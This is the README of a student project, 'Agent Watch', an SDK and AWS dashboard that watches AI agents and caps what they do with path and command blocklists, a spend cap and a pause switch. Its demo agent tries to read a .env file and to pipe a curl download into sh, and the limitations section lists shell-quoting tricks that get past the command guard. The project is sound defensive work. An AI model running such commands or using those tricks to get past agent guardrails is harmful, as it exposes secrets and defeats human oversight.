# Agent Watch

Agent Watch gives students one place to see, control, and cap what their AI agents do. Wrap an agent in three lines, and every LLM call and tool call shows up on a dashboard with its cost. Guardrails (a blocked-path list, a blocked-command list, a daily spend cap, and a pause switch) are enforced in the SDK before the action runs, and an alert goes out by email, and optionally to Discord or Slack, when one fires.

**The problem.** Students build agents on personal API keys with no security team and no budget for mistakes. Nothing shows them what the agent called, which files it touched, or what it cost. One runaway loop can drain a month's budget overnight, and one careless tool can read a `.env` file full of secrets or pipe a script from the internet into a shell.

- `sdk/`: the `agentwatch` Python package (Python 3.11, `requests` only)
- `backend/`: AWS SAM app. API Gateway HTTP API, one Lambda, DynamoDB single table, SNS email topic, optional Discord/Slack webhook, and a $10 monthly AWS Budget
- `dashboard/`: Next.js 14 static export on Amplify Hosting (inventory, agent overview with a spend chart, pause control, rules editor, timeline)
- `demo/`: `demo_agent.py` (well-behaved, Claude on Bedrock with an Anthropic API fallback) and `bad_agent.py` (tries to read `.env` and to run `curl ... | sh`, and gets blocked both times)
- `scripts/`: `verify_deploy.sh` (read-only post-deploy check) and `e2e.sh` (pre-recording smoke test)
- `.kiro/`: the specs, steering, hooks, and MCP settings this was built with

## How it works

```
agent code ── agentwatch SDK ──(wrapped call)──> Bedrock / Anthropic
                   │  guardrails run here, before the call or tool
                   │  HTTPS + credential headers
                   v
        API Gateway HTTP API ──> ApiFunction (Lambda) ──> DynamoDB (one table)
                   ^                    │
        dashboard (Amplify) ───────────┘ blocked events ──> SNS email
                                          └───────────────> Discord / Slack webhook (optional)
```

Diagrams, the route table, the data model, and the design decisions are in `docs/ARCHITECTURE.md`.

| Part | Technology | What it does |
| --- | --- | --- |
| SDK | Python 3.11, `requests` | Wraps the LLM client and tools, enforces guardrails, sends events |
| API | API Gateway HTTP API (throttled 10 rps, burst 20) | Eight routes, all behind credential headers; CORS allows only the dashboard origin |
| Logic | One Lambda, Python 3.11 on arm64 | Validates and stores events, computes cost, owns guardrail config and pause state, sends alerts |
| Storage | DynamoDB, one table, on-demand | Agent records and events, plus a sparse owner index for the inventory |
| Alerts | SNS email topic, optional Discord or Slack incoming webhook | One alert per newly stored blocked event |
| Dashboard | Next.js 14 static export, TypeScript, Tailwind, Amplify Hosting | Reads and edits everything from the browser; no server runtime |
| Infrastructure | AWS SAM (`backend/template.yaml`), AWS Budgets | One template, deployed to us-west-2 |
| Tests | pytest + Hypothesis (38 design properties), vitest + Testing Library | No AWS or network needed |

### How an agent connects and reports events

1. `agentwatch.init(...)` takes the agent id, owner id, and API key. The key never leaves the process: only its SHA-256 is sent, in the `x-agentwatch-key-hash` header, next to `x-agentwatch-owner`. The server stores a hash of that hash.
2. At start-up the SDK fetches the agent's guardrail config, its rolling 24h spend, and its pause state. It refreshes config and spend at most every 60 s and the pause state at most every 5 s, each timed from the last attempt.
3. Every wrapped LLM call becomes an `llm_call` event (model and token counts, never prompt text) and every wrapped tool call a `tool_call` event. They are queued and sent by a background sender with retries, so a slow API never slows the agent.
4. A block is reported as a `blocked` event, sent synchronously before the SDK raises, and the block happens even if the report fails.
5. The first event from a new agent id registers it under that owner and key. The server sets the prices: it ignores any client cost and computes each event's cost from its own pricing table, but the client reports the token counts that cost is based on.

### Guardrails

All four run in the SDK before the call or tool runs. Wrapped calls raise a subclass of `agentwatch.GuardrailBlocked`, and the order is pause, then paths, then commands for tools, and pause, then spend for LLM calls.

| Guardrail | Config | Raises | How it matches |
| --- | --- | --- | --- |
| Blocked paths | `blockedPaths`, a list of names and directories | `agentwatch.PathBlocked` | Every path-like tool argument, in absolute and symlink-resolved forms, NFC plus casefold. A name entry matches any path component; a directory entry matches by prefix and by inode |
| Blocked commands | `blockedCommands`, up to 100 regexes | `agentwatch.CommandBlocked` | Every string tool argument, and every all-string list (an argv), is matched case-insensitively. Patterns are compiled once per config fetch. The dashboard's **Add presets** adds nine presets, including `pipe_to_shell` (`curl ... \| sh`) and `env_file` (reading `.env` through a shell) |
| Daily spend cap | `dailySpendCapUsd`, or none | `agentwatch.SpendCapExceeded` | Before each LLM call: local rolling 24h spend plus a worst-case estimate for the pending call. Over the cap, the provider is never called |
| Pause (kill switch) | Pause state on the agent record, set from the dashboard | `agentwatch.AgentPaused` | Checked before every LLM and tool call. One `paused` blocked event per pause episode, not one per blocked call |

### Alerts

When the API stores a new blocked event, it publishes one alert to SNS (email). If the `AlertWebhookUrl` stack parameter is set, the same alert also goes to the Discord or Slack webhook through a fan-out publisher: each channel is isolated, so a failing webhook never stops the email, and failures are logged by exception type only. Alert text includes the agent id, violation type, time, and the attempt (path, command, or spend), with control characters escaped. A duplicate event sends nothing. If the `AlertAgents` stack parameter lists `owner/agent` pairs, only those agents' blocked events send alerts (see "Alert allowlist").

### Dashboard

Sign in with the same owner id and API key the agent uses. The browser keeps `{ownerId, keyHash}` in localStorage, never the plaintext key, but the hash is the credential: anyone holding it can act as you. Click **Clear credentials** on shared machines.
- **Inventory**: **Agent**, **Model**, **Last activity** (marked "stale" after 24 h), **Total spend** (4 decimals), and **Status** (Paused or Active).
- **Agent page**: an overview tile with rolling spend against the cap, a 24-hour spend chart with blocked calls marked, the pause control (**Pause agent**, then **Confirm pause**; **Resume agent** is one click), the rules editor (blocked paths, blocked commands with **Add presets**, daily spend cap, **Save rules**), and the timeline with a type filter and a **Details** toggle per row. The page refreshes every 30 s and after every change.

## Get started

1. Pick an owner id: 1 to 64 characters of letters, digits, `.`, `_`, or `-`.
2. Generate an API key and save it where only you can read it:
   ```bash
   python -c "import secrets; print(secrets.token_urlsafe(32))" > ~/.agentwatch_key
   chmod 600 ~/.agentwatch_key
   export AGENTWATCH_KEY="$(cat ~/.agentwatch_key)"
   ```
   There is no sign-up. The key is whatever you generate; the server only ever sees its hash. Use a random key like this one: a short or guessable key lets anyone take over your agents.
3. The first use of an agent id (an event from the SDK, or saving rules or pause in the dashboard) claims it for your owner id and key. After that, requests for it with any other owner id or key get 403.

## 3-line integration

```python
import os, agentwatch
aw = agentwatch.init(agent_id="study-bot", owner_id="<your-owner-id>", api_key=os.environ["AGENTWATCH_KEY"])
client, TOOLS = aw.wrap(client), aw.tools(TOOLS)
```

`aw.wrap(client)` accepts a Bedrock runtime client (`converse`) or an Anthropic client (`messages.create`). `aw.tools(TOOLS)` wraps a dict of tool functions; `@aw.tool(path_arg=..., command_arg=...)` marks a single tool's path or command argument. The endpoint comes from `AGENTWATCH_ENDPOINT`, or from `endpoint=` on `init`.

Wrapped calls can raise `agentwatch.PathBlocked`, `agentwatch.CommandBlocked`, `agentwatch.SpendCapExceeded`, or `agentwatch.AgentPaused`. All four subclass `agentwatch.GuardrailBlocked`.

## Deploy

Prerequisites: AWS CLI credentials for us-west-2, SAM CLI, Python 3.11, and Node.js with npm.

1. Backend (from `backend/`):
   ```bash
   sam build
   sam deploy --parameter-overrides AlertEmail=[email] DashboardOrigin=https://main.<app-id>.amplifyapp.com
   ```
   `samconfig.toml` sets stack `agent-watch`, region `us-west-2`, and `confirm_changeset = true`. Review the change set before you accept it. Confirm the SNS subscription email once. The stack output `ApiUrl` is your `AGENTWATCH_ENDPOINT`.
2. Dashboard: connect the repo in AWS Amplify Hosting (platform `WEB`). The root `amplify.yml` is a monorepo spec with `appRoot: dashboard`. Set the env var `NEXT_PUBLIC_API_URL` to the `ApiUrl`. Amplify runs `npm ci` and `npm run build` and serves `out/`.
3. CORS allows only `DashboardOrigin`. For local dashboard development against the deployed API, redeploy with `DashboardOrigin=http://localhost:3000`.

Every later change set must pass `UsePreviousValue` for `AlertEmail`, `DashboardOrigin`, `AlertWebhookUrl`, and `AlertAgents`, so no parameter falls back to its default. On an existing stack, `sam deploy` does this for you: it passes `UsePreviousValue` for every parameter you don't list in `--parameter-overrides` (per the SAM CLI source, checked in version 1.167.0). A parameters file you pass to `aws cloudformation create-change-set` yourself, as in "Webhook alerts", gets no such help: the CloudFormation API reference says a parameter you don't specify gets its template default. So that file must list all four.

### Webhook alerts

Alerts can also go to a Discord or Slack channel, alongside the email. It's optional; leave it unset and only SNS email is used.

1. Create an incoming webhook. Discord: Server Settings, Integrations, Webhooks, New Webhook, Copy Webhook URL. Slack: create an app with Incoming Webhooks enabled and add one to a channel.
2. Treat the URL as a secret: anyone with it can post to your channel. Keep it out of chat, commits, `samconfig.toml`, and logs. Read it into your own shell without echoing it:
   ```bash
   read -rs DISCORD_WEBHOOK_URL && export DISCORD_WEBHOOK_URL
   ```
3. **Prepare the change set.** Don't pass the URL as a command-line argument (for example `--parameter-overrides AlertWebhookUrl=...`): while the command runs, its arguments are visible to anyone on the machine who can run `ps`. Instead, write the parameters to a temporary file that only you can read, and create the change set from it. Run the whole block at once, from `backend/`. It runs in a subshell and stops before anything else if `sam build` or `sam package` fails; it deletes any previously packaged template first, so a failed package can never fall back to an older one. Only then does it write the parameters file. It deletes that file right after the AWS call returns, whether the call succeeded or failed, and a trap deletes it if the block is interrupted first. It doesn't rely on `set -e`, because zsh (the macOS default shell) skips the `EXIT` trap when `set -e` ends a subshell:
   ```bash
   (
     rm -f .aws-sam/packaged.yaml        # never reuse an older package
     sam build || exit 1
     sam package --resolve-s3 --output-template-file .aws-sam/packaged.yaml || exit 1
     [ -s .aws-sam/packaged.yaml ] || { echo "no packaged template; stopping" >&2; exit 1; }
     PARAMS="$(mktemp)" || exit 1        # created with mode 0600: readable only by you
     trap 'rm -f "$PARAMS"' EXIT         # removes it if the block is interrupted
     trap 'exit 1' HUP INT TERM          # turn a signal into an exit, so the EXIT trap runs
     python3 - "$PARAMS" <<'PY'
   import json, os, sys
   json.dump([{"ParameterKey": "AlertEmail", "UsePreviousValue": True},
              {"ParameterKey": "DashboardOrigin", "UsePreviousValue": True},
              {"ParameterKey": "AlertAgents", "UsePreviousValue": True},
              {"ParameterKey": "AlertWebhookUrl", "ParameterValue": os.environ["DISCORD_WEBHOOK_URL"]}],
             open(sys.argv[1], "w"))
   PY
     rc=$?
     if [ "$rc" -eq 0 ]; then
       aws cloudformation create-change-set --stack-name agent-watch --change-set-name webhook-alerts \
         --template-body file://.aws-sam/packaged.yaml --capabilities CAPABILITY_IAM CAPABILITY_AUTO_EXPAND \
         --parameters "file://$PARAMS" --query Id --output text
       rc=$?
     fi
     rm -f "$PARAMS"                     # removed as soon as the call returns, success or failure
     if [ "$rc" -eq 0 ]; then
       aws cloudformation wait change-set-create-complete --stack-name agent-watch --change-set-name webhook-alerts
       rc=$?
     fi
     exit "$rc"
   )
   ```
   The value is read from the environment inside Python, so it never appears in a command's arguments or output. Creating a change set changes nothing in the stack.
4. **Review the complete change set.** Before anyone executes it, list every change, with no parameter values:
   ```bash
   aws cloudformation describe-change-set --stack-name agent-watch --change-set-name webhook-alerts \
     --query 'Changes[].ResourceChange.{Action:Action,Resource:LogicalResourceId,Type:ResourceType,Replacement:Replacement,Scope:Scope,Changed:Details[].Target.[Attribute,Name,RequiresRecreation]}'
   ```
   Don't add `--include-property-values`: it prints before and after values, which can include the webhook URL. Compare the output with a list of resources approved for this deployment, written down before the review: for each one, the expected action (Add, Modify, or Remove), the expected `Replacement` value, and which properties may change. "Nothing is replaced" is not enough: a Modify with `Replacement` False can still change an unexpected resource, its IAM permissions, or its configuration. If any row is missing from the approved list, has a different action or replacement flag, or changes properties that were not expected, don't execute it: delete it with `aws cloudformation delete-change-set --stack-name agent-watch --change-set-name webhook-alerts` and investigate.
5. **Get approval for this change set.** The stack owner approves the reviewed output of this specific change set. An approval covers that change set only. For example, the 2026-10-17 webhook deployment's change set modified `ApiFunction` and `ServerlessHttpApi`, both `Replacement` False. It was executed under a one-time exception approved for exactly that deployment. That approval is not a standing authorization for those resources: every later change set gets its own review and approval.
6. **Execute only after approval**, as a separate step:
   ```bash
   aws cloudformation execute-change-set --stack-name agent-watch --change-set-name webhook-alerts
   aws cloudformation wait stack-update-complete --stack-name agent-watch
   ```
   Then run `scripts/verify_deploy.sh` (see "Verify a deployment").
7. Later change sets keep the URL with `ParameterKey=AlertWebhookUrl,UsePreviousValue=true`, or it resets to empty. Keep `AlertAgents` the same way, or the alert allowlist resets to empty (see "Alert allowlist").

The parameter is `NoEcho`, so CloudFormation masks it in its own views. Only `https://discord.com`, `https://discordapp.com`, and `https://hooks.slack.com` URLs are accepted. Any other value logs one `webhook_url_rejected` warning (without the URL) and sends nothing. A failing webhook never blocks the email. Webhook text is capped at 1900 characters.

### Alert allowlist (`AlertAgents`)

`AlertAgents` is a comma-separated list of `owner/agent` pairs, for example `<owner-id>/bad-bot,<owner-id>/demo-bot`. The Lambda reads it as `ALERT_AGENTS`. When the list is set, only those agents' blocked events send an email or a webhook message. Blocked events from any other agent are still stored, but send no alert. The list holds pairs, not owner ids, because an owner id isn't bound to a key: anyone can create a new agent id under your owner id with their own key. An agent id, once claimed, is bound to its key.

- **Empty (the default) means every agent alerts.** The API URL is public, so with an empty list anyone who creates an agent can make your stack send alerts with text they choose.
- **Keep it on every update.** `sam deploy` keeps it unless you list it in `--parameter-overrides`. A parameters file must include `{"ParameterKey": "AlertAgents", "UsePreviousValue": true}`. Leaving it out of a parameters file clears the allowlist: the omitted parameter gets its template default, which is empty, and alerts open up to every agent again.
- **Changing it is an infrastructure change.** Put the new list in the parameters file as `"ParameterValue"`, not in the CLI shorthand `ParameterKey=AlertAgents,ParameterValue=...`, which splits the value at its commas. Then review, approve, and execute that change set like any other. Editing this README changes nothing in AWS.
- If your stack predates `AlertAgents`, it has no previous value to keep, so on that first update pass a `"ParameterValue"` instead of `UsePreviousValue` (SAM CLI drops `UsePreviousValue` for parameters new to a stack for this reason). An empty value keeps every agent alerting.

## Run the demos

```bash
python3.11 -m venv .venv && source .venv/bin/activate
pip install -r demo/requirements.txt
export AGENTWATCH_ENDPOINT=<ApiUrl> AGENTWATCH_OWNER=<owner-id>
export AGENTWATCH_KEY="$(cat ~/.agentwatch_key)"     # keep the key in a private file, never in the repo
python demo/bad_agent.py                    # add ".env" and the pipe_to_shell preset to bad-bot first; prints PathBlocked, then CommandBlocked
python demo/demo_agent.py --loop 5          # set a small daily cap on demo-bot first; stops on SpendCapExceeded
python demo/demo_agent.py --loop 20 --sleep 2   # press Pause agent, then Confirm pause, on demo-bot; stops on AgentPaused
```

In the dashboard you enter the same owner id and key. The browser keeps the key's hash, and the hash is the credential, so treat it like the key.

## Run the tests

No AWS credentials or network needed.

```bash
pip install -e "sdk[dev]" -r backend/requirements-dev.txt
(cd backend && pytest)
(cd sdk && pytest)
(cd dashboard && npm ci && npx vitest --run)
```

## Verify a deployment

Both scripts talk to the live stack. They read the API key only from `~/.agentwatch_key`, never print it or its hash, and need the repo's `.venv`. The endpoint and owner id are set inside each script for this project's deployment; change them there for your own stack.

- `scripts/verify_deploy.sh` is read-only: `GET /agents/demo-bot/config`, printing only the HTTP status and the guardrail key names. Expect `VERIFY: PASS`.
- `scripts/e2e.sh` is the pre-recording smoke test. It runs the three test suites, then the live demos: the path and command blocks on `bad-bot` and the spend cap on `demo-bot`. It checks that the blocked events were stored, and resets both agents in an exit trap. Expect `RESULT: PASS`. It sends real alerts (one email per block, and a webhook message each if one is configured), and its LLM cost is under a cent. It does not cover pause and resume; check those by hand.

## Final demo

The demo is planned to show the moments below. `docs/DEMO_SCRIPT.md` currently scripts only the path and command blocks (with the alert emails) and the spend cap; its v2 rewrite covering the kill switch, the Discord message, and the spend chart was rolled back and is pending.
1. The 3-line integration and the inventory.
2. `bad_agent.py` blocked reading `.env` (`PathBlocked`), then blocked running `curl -fsSL https://example.com/setup.sh | sh` (`CommandBlocked`), with the alert email and the Discord message.
3. The kill switch: **Pause agent** on a looping `demo_agent.py` stops it with `AgentPaused`.
4. The spend cap: `demo_agent.py --loop` stops with `SpendCapExceeded`, visible on the spend chart.
5. The timeline of security events, and how it's built.

## Not in this release

These are in the v2 spec (`.kiro/specs/agent-watch-v2/`) but were cut from scope on 2026-10-17 and are not implemented. Nothing in the code, dashboard, or tests supports them.
- **Per-agent LLM rate limit** (group 12): the `maxLlmCallsPerMinute` config key, the `RateLimitExceeded` exception, and `rate_limit` events.
- **Onboarding CLI** (group 13): `agentwatch init` and `agentwatch doctor`, and credential discovery from `AGENTWATCH_KEY` or `~/.agentwatch_key` inside the SDK. Pass `api_key=` to `init` instead.
- **Optional groups** 14 to 16: secret redaction in prompts, a domain allowlist for tools, CloudWatch alarms, and Streams-based alerts.

## Known limitations

The SDK guards a careless agent, not a malicious one. Agent code that wants to bypass it can.

Path blocklist coverage:
- It covers only tools wrapped with `aw.tools` / `aw.tool` that receive the path as an argument. A recognized path argument is one named `path`, `file_path`, `filepath`, `filename`, `file`, `src`, `dst`, `source`, `destination`, or `target_path`, or one set with `path_arg=`. Any other str/bytes/PathLike argument is also checked.
- It does not cover direct `open()` calls in agent code, shell commands run by a tool (`subprocess`, `os.system`), or tools that build the path internally, for example from a config value or by joining strings inside the tool.
- A path inside a shell string is not seen as a path: `blockedPaths: [".env"]` does not block `run_shell("cat .env")`. Add the `env_file` command preset to cover shell reads.
- Matching is case-insensitive, so it over-blocks on case-sensitive filesystems: blocking `.env` also blocks `.ENV`. Every string argument is checked, so `search(".env")` is blocked even though it isn't a file read. Both errors fall on the safe side.
- A hardlink to a blocked file under a different name is not caught by a name entry, since it really is a different name. A directory entry catches it only if the link lives inside the blocked directory.
- Check-then-use (TOCTOU): if a symlink is swapped between the SDK's check and the tool's own `open()`, the swap is not caught.

Command guard:
- `blockedCommands` patterns are regexes matched against every string argument of a wrapped tool, not only shell commands, so a pattern can over-block a string that merely mentions a command (a note containing `rm -rf`). Like the path list, it covers only wrapped tools, and an agent that spawns processes itself is not checked.
- Patterns match the literal string, not what the shell will run. Shell quoting tricks such as `c""url ... | sh` or `$(echo curl)` get past them. They catch careless commands, not deliberately obfuscated ones.

Coverage of LLM calls and pricing:
- Only Bedrock `converse` and Anthropic `messages.create` are wrapped. Bedrock `converse_stream` and `invoke_model` pass straight through: no pause or spend check, no event. Anthropic `messages.create(stream=True)` is checked first, but the stream carries no usage the SDK reads, so it records 0 tokens and its cost never counts toward the cap.
- Only Claude Haiku 4.5 is in the pricing table. Every other model costs $0, so its calls never move spend or trip the cap (the SDK warns once per unknown model).

Event content:
- An allowed tool call stores `meta.args`: up to 10 arguments, each the first 200 characters of its `repr`. A tool that takes a token or file contents as an argument leaves that text in DynamoDB and in the dashboard's **Details** view. Prompt and response text is never recorded.

Spend cap:
- The cap is enforced in the SDK process, from a local total resynced from the server at most every 60 s. During a sync, the local total can briefly under-count while completed LLM call events are still queued for sending. The server hasn't counted them yet.
- The pending-call estimate is worst-case (`max_tokens` output), so the block can come one call early. Concurrent threads can each overshoot the cap by about one call, because check and accumulate are not atomic.
- If no config fetch has ever succeeded, no guardrails are active. The SDK logs `agentwatch: guardrails NOT active (config fetch failed)`.

Pause:
- The SDK polls the pause state at most every 5 s and checks it before each call, so a pause takes effect up to 5 s plus one status request after it is pressed. A call already running is not interrupted. While no status fetch has succeeded, pause is not enforced and the SDK warns.

Identity and alerts:
- There is no user auth. Agent ids are global and first-come: the first owner id plus key to report an agent id owns it. `GET /agents/{agentId}/config` reveals whether a name is taken (403 if it belongs to someone else, an empty config if it is free).
- Alerts are at-most-once. A Lambda crash between storing a blocked event and publishing loses that alert. It never sends duplicates.
- Alert channels are published one after another, so a hung webhook adds up to its 3 s timeout to that request. There is one webhook per stack, not per owner.
- `NoEcho` masks the webhook URL in CloudFormation only. It is plaintext in the Lambda's environment configuration, readable by anyone with `lambda:GetFunctionConfiguration`. Secrets Manager would close that and is not used.
- API throttling (10 rps, burst 20) is stage-wide, not per client.
- The spend chart is computed in the browser from up to 20 pages (2000 events) of the timeline, which is enough at demo volume.
